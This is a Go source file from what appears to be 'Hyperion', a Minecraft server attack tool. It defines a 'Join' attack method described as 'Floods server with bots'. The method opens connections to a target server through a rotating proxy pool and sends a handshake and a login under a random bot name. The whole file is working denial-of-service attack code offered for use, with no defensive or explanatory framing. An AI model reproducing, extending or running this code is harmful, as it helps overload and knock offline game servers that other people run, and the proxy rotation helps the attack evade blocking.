package methods

import (
	"Hyperion/core"
	"Hyperion/core/proxy"
	"Hyperion/mc"
	"Hyperion/mc/mcutils"
	"Hyperion/utils"
)

type Join struct{}

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Floods server with bots"
}

func (join Join) Start(info *core.AttackInfo, dialPool *proxy.DialPool) {
	go connect(info, dialPool)
}
func connect(info *core.AttackInfo, dialPool *proxy.DialPool) {
	{
		conn, err := mc.DialMC(info.Ip, info.Port, dialPool.GetNext())
		if err != nil {
			return
		}
		mcutils.WriteHandshake(conn, info.Ip, info.Port, info.Protocol, mcutils.Login)
		mcutils.WriteLoginPacket(conn, utils.RandomName(10), false, nil)
	}
}
func (join Join) Stop() {
	// implementation for stopping the join method
}
